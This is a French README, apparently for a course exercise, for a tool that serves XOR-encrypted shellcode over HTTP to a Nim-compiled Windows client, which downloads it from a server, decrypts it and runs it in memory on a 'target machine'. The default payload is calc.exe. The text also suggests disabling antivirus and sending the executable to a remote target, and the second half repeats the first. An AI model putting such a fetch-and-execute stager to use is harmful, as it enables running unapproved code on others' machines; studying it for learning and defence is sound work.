﻿# ShellcodeNim

Un outil permettant de générer et d'exécuter du shellcode chiffré en utilisant Nim et Python.

## Description

Ce projet combine Python pour la génération et le chiffrement de shellcode avec Nim pour l'exécution côté client. Il permet de :
- Générer du shellcode chiffré via Python
- Servir ce shellcode via un serveur HTTP
- Exécuter le shellcode via un exectuable généré par Nim

## Prérequis

### Côté Serveur
- Python 3.x
- Système d'exploitation compatible (Linux, macOS, Windows)

### Génération de l'executable
- Nim doit être installé sur le système.
- Compiler Nim pour générer l'exécutable pour le faire tourner sur un système windows (See the nim docs to cross-compile for Windows from Linux or macOS using the MinGW-w64 toolchain)

## Installation

### Configuration du Serveur

1. Vérifiez l'installation de Python :
```bash
python3 --version
```

2. Générez le shellcode chiffré :
```bash
python3 shellcode_encrypt.py
```
Un fichier `shellcode_encrypted.bin` sera créé dans le répertoire courant.

3. Démarrez le serveur HTTP :
```bash
python3 -m http.server 8000
```
Le shellcode sera accessible à l'adresse : `http://<IP_SERVEUR>:8000/shellcode_encrypted.bin`

### Compilation de l'executable Client :

1. Vérifiez l'installation de Nim :
```bash
nim --version
```

2. Compilez le client (See the nim docs to cross-compile for Windows from Linux or macOS using the MinGW-w64 toolchain) :
```bash
nim c -d:release exo2bonus.nim
```
Cette commande générera l'exécutable `exo2bonus.exe`.

## Utilisation

1. Sur la machine cible, exécutez le client en spécifiant l'IP du serveur :
```bash
exo2bonus.exe <IP_SERVEUR>
```

Exemple :
```bash
exo2bonus.exe 192.168.1.10
```

Le client va :
1. Télécharger le shellcode chiffré depuis le serveur
2. Le déchiffrer en utilisant la clé XOR intégrée
3. L'exécuter en mémoire

## Déploiement

L'exécutable compilé peut être déployé sur n'importe quelle machine Windows compatible, sans nécessiter l'installation de Nim. Il suffit de transférer le fichier `exo2bonus.exe` sur la machine cible.

## Résolution des problèmes courants

### Erreurs de connexion
- Vérifiez que le serveur HTTP est en cours d'exécution
- Assurez-vous que le port 8000 est accessible
- Vérifiez que l'IP du serveur est correcte

### Erreurs d'exécution
- Vérifiez que la clé XOR est identique entre le serveur (Python) et le client (Nim)
- Désactivez temporairement l'antivirus si nécessaire
- Assurez-vous d'avoir les permissions nécessaires pour l'exécution

## Avertissements

- Le shellcode par défaut exécute calc.exe (à des fins de démonstration)
- Cet outil est destiné uniquement à des fins éducatives et de test
- Certains antivirus peuvent détecter et bloquer l'exécution
- L'utilisation malveillante de cet outil est strictement interdite





## Prérequis

1. Environnement du serveur (Python 3.x)

Python 3.x doit être installé sur le système.

Système d'exploitation : Linux, macOS ou Windows.

2. Génération de l'executable :

Nim doit être installé sur le système.

Compiler Nim pour générer l'exécutable.

## Installation et exécution

1. Configuration et exécution du serveur

Sur le système serveur (Linux/Windows) :

Installer Python 3
Assurez-vous que Python 3.x est installé. Pour vérifier :

python3 --version

## Générer le shellcode
Exécutez le script Python pour générer le shellcode chiffré :

python3 shellcode_encrypt.py

Le fichier shellcode_encrypted.bin sera créé dans le répertoire actuel.

Servir le fichier via HTTP
Utilisez Python pour lancer un serveur HTTP simple sur le port 8000 :

python3 -m http.server 8000

Le shellcode sera accessible via :

http://<IP_DU_SERVEUR>:8000/shellcode_encrypted.bin

Exemple : Si l'IP du serveur est 192.168.1.10 :

http://192.168.1.10:8000/shellcode_encrypted.bin

2. Compilation et exécution du client

Sur la machine qui sert a générer l'excutable, cela peut etre le serveur ou une autre machine :

Installer Nim

Téléchargez et installez Nim depuis nim-lang.org.

Vérifiez l'installation :

nim --version

Compiler le client
Compilez le fichier exo2bonus.nim :

nim c -d:release exo2bonus.nim

Cela génère un exécutable exo2bonus.exe.

## Lancement de l'executable
Lancez le client en spécifiant l'IP du serveur :

exo2bonus.exe <IP_DU_SERVEUR>

Exemple :

exo2bonus.exe 192.168.1.10

Le client va :

Télécharger le shellcode chiffré depuis le serveur.

Le déchiffrer avec la clé XOR intégrée.

L'exécuter en mémoire.

Déploiement de l'exécutable
Une fois compilé, l'exécutable peut être utilisé sur n'importe quelle machine Windows, sans avoir besoin de Nim. Vous pouvez transmettre cet exécutable à une cible distante pour qu'elle l'exécute directement.

## Notes importantes

Le shellcode actuel lance calc.exe (pour des tests). Vous pouvez le modifier dans shellcode_encrypt.py.

Utilisez cet outil uniquement à des fins légales et d'apprentissage.

Sur certains systèmes, un antivirus peut bloquer l'exécution.

## Dépannage

Erreur lors de l'exécution du client

Assurez-vous que le serveur est accessible et fonctionne.

Vérifiez l'URL et le port.

Clé de chiffrement
La clé XOR doit être identique sur le serveur (Python) et le client (Nim).
